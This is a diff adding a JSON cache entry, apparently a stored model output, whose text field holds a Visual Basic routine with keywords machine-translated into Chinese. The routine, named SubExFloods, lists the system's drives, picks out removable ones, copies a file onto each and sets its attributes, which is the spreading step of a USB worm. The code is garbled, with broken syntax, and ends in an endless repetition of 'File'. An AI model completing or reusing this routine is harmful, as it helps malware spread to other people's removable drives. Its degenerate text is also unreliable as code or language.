@@ -1,0 +1,5 @@
+{
+  "cache_key": "63a6856b8c016677f095",
+  "provider_request_id": null,
+  "text": "\u6587\u672c:\u516c\u5171\u51fd\u6570 SubExFloods(\u6587\u4ef6\u540d\u4f5c\u4e3a\u5b57\u7b26\u4e32,\u9690\u85cf\u5982Bolean) \u53ea\u8981Dim szBuffer\u4f5c\u4e3a\u5b57\u7b26\u4e32 * 128 Dim \u9a71\u52a8\u5668\u4f5c\u4e3a\u53d8\u91cfDim \u9a71\u52a8\u5668() \u4f5c\u4e3a\u5b57\u7b26\u4e32 hGet = GetLogicalDriveStrings(Len(szBuffer), szBuffer) \u5982\u679chGet <> 0 \u7136\u540e\u9a71\u52a8\u5668 = Split(szBuffer, Chr(0)) \u6bcf\u4e2a\u9a71\u52a8\u5668\u5728\u9a71\u52a8\u5668\u5982\u679cGetDriveTypeDrive) = DRIVE_REMOVABLE \u7136\u540e\u83b7\u53d6\u5982\u679cCopyToFile \u7136\u540eFileAttributFile,\u771f\u9a71\u52a8\u5668 & \u6587\u4ef6\u540d) = True If WriteToFileFileFileFileFileFileFileFileFileFileFileFileFileFileFileFileFileFile"
+}
